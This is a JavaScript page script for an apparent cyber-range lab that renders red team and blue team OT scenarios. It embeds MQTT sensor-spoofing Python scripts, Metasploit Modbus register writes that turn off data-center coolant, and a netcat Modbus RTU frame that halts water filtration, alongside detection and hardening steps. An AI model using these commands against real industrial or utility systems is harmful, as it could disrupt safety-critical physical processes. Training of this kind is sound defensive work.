const domainTitles = {
  airport: "Airport",
  "water-treatment": "Water Treatment",
  industry: "Industrial",
  hospital: "Hospital",
  banking: "Banking",
  "power-grid": "Power Grid",
  "toll-plaza": "Toll Plaza",
  "data-center": "Data Center",
  "stock-market": "Stock Market",
  metro: "Metro",
  warehouse: "Warehouse"
};

const industryDashboardUrl = "http://172.16.17.204:1880/ui/#!/4?socketid=zxL7Ex3NoOUjbRHMAAAB";
const dataCenterDashboardUrl = "http://172.16.17.204:1880/ui/#!/7?socketid=vmNCQThlV3IuIaD_AAAV";
const waterTreatmentDashboardUrl = "http://172.16.17.204:1880/ui/#!/1?socketid=F6KardZPucXn7VJVAAAf";

const scriptCode = {
  single: `import paho.mqtt.client as mqtt
import time

# MQTT broker details
broker_address = "172.16.17.207"
topic = "ZPHS01B/NO2"

client = mqtt.Client()
client.connect(broker_address)

try:
    while True:
        client.publish(topic, "100")
        print(f"Data '100' sent to topic {topic}")
        time.sleep(0.1)
except KeyboardInterrupt:
    print("Process interrupted")
finally:
    client.disconnect()`,
  all: `import paho.mqtt.client as mqtt
import time

broker_address = "172.16.17.207"
attack_value = "999"
scan_duration = 10
attack_delay = 0.02

seen_topics = set()

def on_message(client, userdata, message):
    topic = message.topic
    if topic not in seen_topics:
        print(f"[SCAN] Found topic: {topic}")
        seen_topics.add(topic)

scan_client = mqtt.Client()
scan_client.on_message = on_message
scan_client.connect(broker_address)
scan_client.subscribe("#")
scan_client.loop_start()

print(f"[*] Scanning for attack surfaces for {scan_duration} seconds...")
time.sleep(scan_duration)
scan_client.loop_stop()
scan_client.disconnect()

print(f"[+] Found {len(seen_topics)} topics: {seen_topics}")

attack_client = mqtt.Client()
attack_client.connect(broker_address)

try:
    print("[!] Launching MQTT spoofing simulation...")
    while True:
        for topic in seen_topics:
            attack_client.publish(topic, attack_value)
            print(f"[SIM] Sent fake value '{attack_value}' to topic '{topic}'")
            time.sleep(attack_delay)
except KeyboardInterrupt:
    print("\\n[!] Simulation stopped by user.")
finally:
    attack_client.disconnect()`
};

const industryScenarios = {
  red: {
    kicker: "Red Team Scenario",
    title: "Industrial Attack Surface Training",
    summary: "Students simulate a lab-only MQTT sensor spoofing incident from a Kali machine and observe fake industrial values appearing live in the Industrial dashboard.",
    badges: ["Kali machine", "MQTT broker 172.16.17.207", "Node-RED dashboard"],
    steps: [
      "Connect Kali to the Phygital Lab network.",
      "Open the Industrial dashboard and keep it visible during the simulation.",
      "Run single.py first to spoof only the NO2 topic and watch one gauge change.",
      "Run all.py to scan visible MQTT topics and publish fake values to all discovered topics.",
      "Stop the script with Ctrl+C and record which values changed."
    ],
    commands: `cd /home/kali/documents
python3 -m pip install paho-mqtt
python3 single.py
python3 all.py`,
    links: [
      { label: "Open Industrial Dashboard", href: industryDashboardUrl }
    ]
  },
  blue: {
    kicker: "Blue Team Scenario",
    title: "Industrial Mitigation And Response",
    summary: "Students defend the Industrial model by detecting MQTT spoofing, stopping the simulation safely, restoring trusted values, and documenting hardening steps.",
    badges: ["Detect", "Contain", "Recover", "Harden"],
    steps: [
      "Detect: open the Industrial dashboard and identify impossible or sudden values such as NO2, CO2, VOC, gas, or humidity spikes.",
      "Confirm: compare dashboard readings with the physical model and normal operating range to confirm the values are fake.",
      "Contain: ask the Red Team/Kali operator to stop the running script with Ctrl+C. If the attacker machine is unknown, isolate the suspected Kali host from the lab network.",
      "Recover: wait for real sensor values to return, then refresh the dashboard and confirm gauges are stable.",
      "Document: record affected MQTT topics, fake values, time observed, suspected source IP, and recovery action.",
      "Harden: recommend MQTT authentication, disable anonymous publish, apply topic ACLs, restrict port 1883, segment the Industrial network, and add alert thresholds in Node-RED."
    ],
    actionTitle: "Mitigation Steps",
    commands: `1. Stop the attack script on Kali:
   Press Ctrl+C in the terminal running single.py or all.py

2. If the source is unknown:
   Disconnect/isolate the suspicious Kali machine from the lab network

3. Validate recovery:
   Refresh the Industrial dashboard
   Confirm sensor values return to normal

4. Hardening checklist:
   Enable MQTT username/password
   Disable anonymous publish
   Add topic ACLs
   Restrict broker port 1883 to trusted hosts
   Add Node-RED alerts for impossible values`,
    links: [
      { label: "Open Industrial Dashboard", href: industryDashboardUrl }
    ]
  }
};

const dataCenterScenarios = {
  red: {
    kicker: "Red Team Scenario",
    title: "Data Center HVAC Modbus Attack Surface",
    summary: "Students simulate a lab-only Modbus TCP attack path against the Data Center HVAC PLC and observe how coolant and ventilation control changes affect the dashboard.",
    badges: ["Modbus TCP", "PLC 172.16.17.126", "Port 502", "HVAC"],
    steps: [
      "Connect Kali to the Phygital Lab network and open the Data Center HVAC dashboard.",
      "Scan the PLC to confirm Modbus TCP is exposed on port 502.",
      "Use Metasploit's Modbus client scanner to read register values while someone controls the HVAC coolant from the dashboard.",
      "Identify the register mapping: data_address 0 controls coolant and data_address 1 controls the ventilation fan.",
      "Write the captured lab values to control coolant state and observe dashboard impact.",
      "Restore the coolant to the safe ON state before ending the drill."
    ],
    actionTitle: "Modbus Lab Commands",
    commands: `nmap -p 502 172.16.17.126

msfconsole
use auxiliary/scanner/scada/modbusclient
set rhosts 172.16.17.126
set data_address 1
run

# Coolant register discovered during the lab
set data_address 0
set action write_register
set data 333
run

# Restore coolant ON
set data 111
run`,
    links: [
      { label: "Open Data Center Dashboard", href: dataCenterDashboardUrl }
    ]
  },
  blue: {
    kicker: "Blue Team Scenario",
    title: "Data Center HVAC Mitigation And Response",
    summary: "Students defend the Data Center model by detecting unauthorized Modbus writes, restoring HVAC coolant, and recommending protections for the PLC network.",
    badges: ["Detect", "Contain", "Restore Cooling", "Harden Modbus"],
    steps: [
      "Detect: watch the Data Center dashboard for coolant OFF state, ventilation changes, or abnormal temperature rise.",
      "Confirm: compare dashboard state with physical model behavior and expected HVAC control commands.",
      "Contain: stop the unauthorized Modbus client session and isolate the attacking Kali host from the PLC network.",
      "Recover: restore coolant ON using the approved dashboard control or authorized recovery command.",
      "Validate: confirm coolant returns to ON and temperature stabilizes on the dashboard.",
      "Harden: restrict port 502, allow only trusted HMI/SCADA hosts, segment the PLC VLAN, alert on Modbus write_register operations, and document register access."
    ],
    actionTitle: "Mitigation Steps",
    commands: `1. Stop unauthorized activity:
   Close the Modbus client session
   Isolate the suspicious Kali host from the PLC network

2. Restore safe HVAC state:
   Turn coolant ON from the approved dashboard
   Confirm data_address 0 returns to the safe coolant state

3. Validate recovery:
   Watch the Data Center dashboard
   Confirm coolant is ON and temperature stabilizes

4. Hardening checklist:
   Restrict TCP/502 to trusted HMI or SCADA hosts
   Segment PLC and student networks
   Alert on Modbus write_register actions
   Document allowed register addresses
   Keep a manual HVAC recovery SOP`,
    links: [
      { label: "Open Data Center Dashboard", href: dataCenterDashboardUrl }
    ]
  }
};

const waterTreatmentScenarios = {
  red: {
    kicker: "Red Team Scenario",
    title: "Water Treatment Moxa Modbus RTU Attack Surface",
    summary: "Students simulate an authorized lab-only Modbus RTU-over-TCP command injection path against the Water Treatment model and observe filtration or recycle pump behavior on the dashboard.",
    badges: ["Moxa NPort", "Modbus RTU over TCP", "Port 4001", "Water Treatment"],
    steps: [
      "Open the Water Treatment dashboard and use the approved dashboard controls to start the physical model.",
      "Identify the Moxa NPort device in the Water Treatment network and confirm the approved lab target IP.",
      "Confirm that TCP port 4001 is reachable on the Moxa device.",
      "Use the approved Modbus RTU HEX command generated for the lab to send a command through netcat.",
      "Observe the dashboard and physical model for filter or pump state changes.",
      "Restore the model using the approved dashboard controls before ending the drill."
    ],
    actionTitle: "Moxa Lab Commands",
    commands: `# Approved lab target
MOXA_IP=172.16.17.133
MOXA_PORT=4001

# Confirm the Moxa serial gateway port is reachable
nmap -p 4001 $MOXA_IP

# Lab example: generated Modbus RTU command used to stop filtration
python3 -c "import sys; sys.stdout.buffer.write(bytes.fromhex('01100000000102014D67F5'))" | nc $MOXA_IP $MOXA_PORT

# Safety note:
# Run only approved HEX commands for this lab and restore the model from the dashboard after testing.`,
    links: [
      { label: "Open Water Treatment Dashboard", href: waterTreatmentDashboardUrl }
    ]
  },
  blue: {
    kicker: "Blue Team Scenario",
    title: "Water Treatment Mitigation And Response",
    summary: "Students defend the Water Treatment model by detecting unauthorized commands through the Moxa gateway, restoring filtration and recycle pump operation, and documenting OT hardening steps.",
    badges: ["Detect", "Contain Moxa Access", "Restore Pumps", "Harden OT"],
    steps: [
      "Detect: monitor the Water Treatment dashboard for unexpected filtration stop or recycle pump changes.",
      "Confirm: compare dashboard state with the physical model and expected operator actions.",
      "Contain: stop the unauthorized netcat/Python session and isolate the attacking Kali host from the Water Treatment network.",
      "Recover: use the approved dashboard controls to restart filtration and pump operation.",
      "Validate: confirm filtration and recycle pump state are stable on the dashboard and physical model.",
      "Harden: restrict TCP/4001 to trusted engineering/HMI hosts, segment the Moxa gateway, log serial gateway connections, alert on unauthorized write commands, and document approved Modbus command use."
    ],
    actionTitle: "Mitigation Steps",
    commands: `1. Stop unauthorized activity:
   Close the Python/netcat command session
   Isolate the suspicious Kali host from the Water Treatment network

2. Restore safe plant operation:
   Open the Water Treatment dashboard
   Restart filtration and recycle pump using approved controls

3. Validate recovery:
   Confirm dashboard state matches the physical model
   Check that filtration and pump indicators stay stable

4. Hardening checklist:
   Restrict TCP/4001 to trusted HMI or engineering hosts
   Segment the Moxa serial gateway from student networks
   Log and alert on Moxa gateway sessions
   Alert on unauthorized Modbus RTU write commands
   Maintain an approved command/register inventory`,
    links: [
      { label: "Open Water Treatment Dashboard", href: waterTreatmentDashboardUrl }
    ]
  }
};

function getScenario(domain, mode) {
  if (domain === "water-treatment") return waterTreatmentScenarios[mode] || waterTreatmentScenarios.red;
  if (domain === "industry") return industryScenarios[mode] || industryScenarios.red;
  if (domain === "data-center") return dataCenterScenarios[mode] || dataCenterScenarios.red;
  const title = domainTitles[domain] || "Model";
  const isRed = mode === "red";
  return {
    kicker: isRed ? "Red Team Scenario" : "Blue Team Scenario",
    title: isRed ? `${title} Attack Surface Training` : `${title} Monitoring And Response`,
    summary: "This page is ready for a model-specific lab scenario. Add the script, dashboard link, and student instructions for this model when available.",
    badges: isRed ? ["Lab scenario", "CTF-ready", "Student drill"] : ["Monitoring", "Evidence", "Response"],
    steps: isRed
      ? [
        "Review the model overview and identify approved lab targets.",
        "Run only the authorized training script for this model.",
        "Observe the model dashboard and capture evidence.",
        "Stop the simulation and hand findings to the Blue Team."
      ]
      : [
        "Monitor the model dashboard for abnormal behavior.",
        "Compare dashboard signals with physical model state.",
        "Record affected devices, values, and time.",
        "Recommend controls and recovery steps."
      ],
    actionTitle: isRed ? "Scenario Status" : "Mitigation Status",
    commands: isRed ? "No Python script has been added for this model yet." : "No model-specific mitigation playbook has been added yet.",
    links: []
  };
}

function renderScenario() {
  const params = new URLSearchParams(window.location.search);
  const domain = params.get("domain") || "industry";
  const mode = params.get("mode") || "red";
  const showPythonCode = false;
  const scenario = getScenario(domain, mode);

  document.title = `${scenario.title} - Phygital Lab`;
  document.getElementById("scenario-kicker").textContent = scenario.kicker;
  document.getElementById("scenario-title").textContent = scenario.title;
  document.getElementById("scenario-summary").textContent = scenario.summary;
  document.getElementById("scenario-badges").innerHTML = scenario.badges.map((badge) => `<span>${badge}</span>`).join("");
  document.getElementById("scenario-steps").innerHTML = scenario.steps.map((step) => `<li>${step}</li>`).join("");
  document.getElementById("scenario-action-title").textContent = scenario.actionTitle || "Kali Commands";
  document.getElementById("scenario-commands").textContent = scenario.commands;
  document.getElementById("scenario-command-note").hidden = true;
  document.getElementById("scenario-code-section").hidden = !showPythonCode;
  document.getElementById("scenario-links").innerHTML = scenario.links.map((link) => (
    `<button class="scenario-dashboard-btn" type="button" data-href="${link.href}">${link.label}</button>`
  )).join("");
}

document.addEventListener("DOMContentLoaded", () => {
  renderScenario();
  document.querySelectorAll("[data-code-target]").forEach((button) => {
    button.addEventListener("click", () => {
      const target = button.dataset.codeTarget;
      document.getElementById("scenario-code-view").textContent = scriptCode[target] || "Code not available.";
    });
  });
  document.getElementById("scenario-links").addEventListener("click", (event) => {
    const button = event.target.closest("[data-href]");
    if (!button) return;
    window.open(button.dataset.href, "_blank", "noopener");
  });
});
